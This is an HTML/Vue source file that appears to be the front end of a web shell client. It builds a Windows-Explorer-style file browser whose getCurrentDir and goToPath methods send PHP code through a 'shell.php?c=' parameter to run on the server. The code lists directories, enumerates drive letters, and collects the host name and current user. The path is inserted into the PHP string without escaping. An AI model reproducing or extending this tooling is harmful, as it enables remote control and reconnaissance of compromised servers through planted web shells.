<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script crossorigin="anonymous" integrity="sha384-LVoNJ6yst/aLxKvxwp6s2GAabqPczfWh6xzm38S/YtjUyZ+3aTKOnD/OJVGYLZDl"
            src="https://lib.baomitu.com/jquery/3.5.0/jquery.min.js"></script>
    <script crossorigin="anonymous"
            integrity="sha512-BKbSR+cfyxLdMAsE0naLReFSLg8/pjbgfxHh/k/kUC82Hy7r6HtR5hLhobaln2gcTvzkyyehrdREdjpsQwy2Jw=="
            src="https://lib.baomitu.com/vue/2.6.12/vue.min.js"></script>
</head>
<body>
<div class="content" id="app">
    <div class="tabs">
        <div class="tab">
            code11111
        </div>
        <div class="tab">
            asdfasdfasd
        </div>
    </div>
    <div class="tab-content">
        <div class="left-dir">
            <!--            <div class="dir" v-for="item of dirs">-->
            <!--                <div class="name">{{item.name}}</div>-->
            <!--                <div class="children">-->
            <!--                    <div class="dir">-->
            <!--                        <div class="name">1.1</div>-->
            <!--                        <div class="children">-->
            <!--                        </div>-->
            <!--                    </div>-->
            <!--                </div>-->
            <!--            </div>-->
            <dir-item :list="dirs" class="dir"></dir-item>
        </div>
        <div class="dir-content">
            <div class="nav-bar">
                <div class="option-container">
                    <div class="breadcrumb-container">
                        <div class="breadcrumb">
                            <div v-for="item of current_parse_path">{{item}}</div>
                        </div>
                        <input type="text" :value="current_path">
                    </div>
                    <div class="options">
                        <div>
                            <img class="arrow-right" src="${require(`../../assets/img/arrow.png`)}" alt="">
                        </div>
                        <div>
                            <img class="arrow-up" src="${require(`../../assets/img/arrow.png`)}" alt="">
                        </div>
                        <div>
                            <img class="home" src="${require(`../../assets/img/home.png`)}" alt=""
                                 @click="goToPath(home_path)">
                        </div>
                        <div>
                            <img class="refresh" src="${require(`../../assets/img/refresh.png`)}" alt=""
                                 @click="goToPath(current_path)">
                        </div>
                    </div>
                </div>
                <div class="search">
                    <img class="arrow-right" src="${require(`../../assets/img/search.png`)}" alt="">
                    <input type="text" value="" placeholder="搜索">
                </div>
            </div>
            <div class="dir">
                <div class="name">名称</div>
                <div class="change-date">修改日期</div>
                <div class="type">类型</div>
                <div class="size">大小</div>
            </div>
            <div class="dir " :class="item.isActive?'active':''" v-for="item of current_dir"
                 @click="dirClick(item)" @dblclick="dbClick(item)" @contextmenu.prevent="contextmenu(item)">
                <div class="name">{{item.name}}</div>
                <div class="change-date">{{item.change_date}}</div>
                <div class="type">{{item|fileType}}</div>
                <div class="size">{{item.file_size|size}}</div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
<script>
    // 定义一个名为 button-counter 的新组件
    Vue.component('dir-item', {
        name: 'DirItem',  //组件命名
        props: {
            list: Array,
            deep: {
                type: Number,
                default: 0
            },
            path: {
                type: String,
                default: ''
            },
        },
        methods: {
            calcMarginLeft(i) {
                console.log(i);
                return 'padding-left:' + 10 * i + 'px;'
            },
            test(v) {
                console.log(v);
            }
        },
        template: '  <div  v-for="(item,index) in list" :key="index">\n' +
            '            <div :style="calcMarginLeft(deep)" class="name" @click="test(index)">' +
            '                <img src="${require(`../../assets/img/file.png`)}" alt="">  ' +
            '                <span>{{item.name}}</span>' +
            '            </div>\n' +
            '           <dir-item class="children" :deep="deep+1"  v-if="item.children" :list="item.children"></dir-item>\n' +
            '         </div>'
    })
    console.log2 = function (v) {
        console.log(JSON.stringify(v, null, 4))
    }
    new Vue({
        el: '#app',
        data: {
            root_path: '',
            current_dir: [],
            current_path: '',
            current_parse_path: [],
            home_path: '',
            dirs: [],
        },
        created() {
            this.getCurrentDir()
        },
        filters: {
            size(r) {
                if (!r) return ''
                let kb = r / 1024
                if (kb > 1024 * 1024) {
                    let gb = kb / (1024 * 1024)
                    return gb.toFixed(2) + ' GB'
                } else if (kb > 1024) {
                    let mb = kb / 1024
                    return Math.ceil(mb) + ' MB'
                } else {
                    return Math.ceil(kb) + ' KB'
                }
            },
            fileType(r) {
                if (!r) return ''
                if (r.type) {
                    if (r.name === '.' || r.name === '..') {
                        return ''
                    }
                    return '文件夹'
                } else {
                    let suffix = r.name.split('.').pop()
                    switch (suffix) {
                        case 'txt':
                            return '文本'
                        case 'doc':
                        case 'docx':
                            return 'DOC 文档'
                        case 'pdf':
                            return 'PDF 文档'
                        case 'exe':
                            return '应用程序'
                        case 'php':
                            return 'PHP文件'
                        case 'asp':
                            return 'ASP文件'
                        case 'jsp':
                            return 'JSP文件'
                        default:
                            return '未知文件'
                    }
                }
            }
        },
        methods: {
            parsePath(path) {
                path = path.replace(/\\/g, '/')
                if (path.endsWith('/')) {
                    path = path.substr(0, path.length - 1)
                }
                let paths = path.split('/')
                this.current_parse_path = paths
                console.log(paths);
                this.diffChild(paths)
            },
            diffChild(paths) {
                let deepIndex = 0
                let deepObj = {}
                for (let i = 0; i < paths.length; i++) {
                    let v = paths[i]
                    if (deepIndex) {
                        let index = this.dirs[deepIndex].children.findIndex(w => w.name === v)
                        if (index !== -1) {
                            deepIndex = i
                            deepObj['i' + deepIndex] = index
                        } else {
                            break
                        }
                    } else {
                        let index = this.dirs.findIndex(w => w.name === v)
                        if (index !== -1) {
                            deepIndex = i
                            deepObj['i' + deepIndex] = index
                        } else {
                            break
                        }
                    }
                }
                if (deepIndex) {

                } else {
                    let pathDir = {}
                    for (let i = paths.length - 1; i >= 0; i--) {
                        let v = paths[i]
                        if (i === paths.length - 1) {
                            pathDir.name = v
                            pathDir.children = []
                        } else {
                            let temp = {}
                            temp.name = v
                            temp.children = [pathDir]
                            pathDir = temp
                        }
                    }
                    console.log2(pathDir);
                    this.dirs.push(pathDir)
                }
                console.log(deepIndex);
                console.log(deepObj);
            },
            contextmenu(item) {
                console.log(item);
            },
            getCurrentDir() {
                let that = this
                let phpCode = '$dir = getcwd().\'/\';$res = [];foreach (scandir($dir) as $value) {$file = $dir . $value;if (!file_exists($file)) {continue;}$f = [];$f[\'type\'] = is_dir($dir . $value);$f[\'name\'] = $value;$f[\'change_date\'] = date("Y/m/d H:i", filemtime($file));if (!is_dir($file)) {$f[\'file_size\'] = filesize($file);} else {$f[\'file_size\'] = 0;}$res[] = $f;}print_r(json_encode($res));';
                phpCode = '@ini_set("display_errors", "0"); @set_time_limit(0); $current_path = dirname($_SERVER["SCRIPT_FILENAME"]); if ($current_path == "") $current_path = dirname($_SERVER["PATH_TRANSLATED"]); $dir = $current_path . \'/\'; $res = [\'current_path\' => $dir]; $current_dir = []; foreach (scandir($dir) as $value) { $file = $dir . $value; if (!file_exists($file)) { continue; } $f = []; $f[\'type\'] = is_dir($dir . $value); $f[\'name\'] = $value; $f[\'change_date\'] = date("Y/m/d H:i", filemtime($file)); if (!is_dir($file)) { $f[\'file_size\'] = filesize($file); } else { $f[\'file_size\'] = 0; } $current_dir[] = $f; } $res[\'current_dir\'] = $current_dir; $root_path = \'\'; if (substr($current_path, 0, 1) != "/") { foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $root_path .= "{$L}:"; } else { $root_path .= "/"; } $res[\'root_path\'] = $root_path; $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : ""; $s = ($u) ? $u["name"] : @get_current_user(); $res[\'pc_name\'] = php_uname(); $res[\'user\'] = $s; print_r(json_encode($res));'
                $.ajax({
                    url: 'http://localhost/shell.php?c=' + phpCode,
                    success(res) {
                        res = JSON.parse(res)
                        that.root_path = res.root_path
                        that.current_dir = res.current_dir.map(v => {
                            v.isActive = false;
                            return v
                        })
                        that.current_path = res.current_path
                        that.parsePath(that.current_path)
                        that.home_path = res.current_path
                    }
                })
            },
            dirClick(item) {
                this.current_dir = this.current_dir.map(v => {
                    v.isActive = false;
                    return v
                })
                item.isActive = true
            },
            goToPath(path) {
                if (!path) {
                    return this.getCurrentDir()
                }
                let that = this
                let phpCode = '';
                phpCode = '@ini_set("display_errors", "0"); @set_time_limit(0); $current_path = \'' + path + '\'; $dir = $current_path . \'/\'; $res = [\'current_path\' => $dir]; $current_dir = []; foreach (scandir($dir) as $value) { $file = $dir . $value; if (!file_exists($file)) { continue; } $f = []; $f[\'type\'] = is_dir($dir . $value); $f[\'name\'] = $value; $f[\'change_date\'] = date("Y/m/d H:i", filemtime($file)); if (!is_dir($file)) { $f[\'file_size\'] = filesize($file); } else { $f[\'file_size\'] = 0; } $current_dir[] = $f; } $res[\'current_dir\'] = $current_dir; $root_path = \'\'; if (substr($current_path, 0, 1) != "/") { foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $root_path .= "{$L}:"; } else { $root_path .= "/"; } $res[\'root_path\'] = $root_path; $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : ""; $s = ($u) ? $u["name"] : @get_current_user(); $res[\'pc_name\'] = php_uname(); $res[\'user\'] = $s; print_r(json_encode($res));'
                $.ajax({
                    url: 'http://localhost/shell.php?c=' + phpCode,
                    success(res) {
                        res = JSON.parse(res)
                        that.root_path = res.root_path
                        that.current_dir = res.current_dir.map(v => {
                            v.isActive = false;
                            return v
                        })
                        that.current_path = res.current_path
                    }
                })
            },
            dbClick(item) {
                console.log(item.name);
                let gotoPath = this.current_path + item.name
                if (item.type) {
                    this.goToPath(gotoPath)
                } else {

                }

            }
        }
    })
</script>
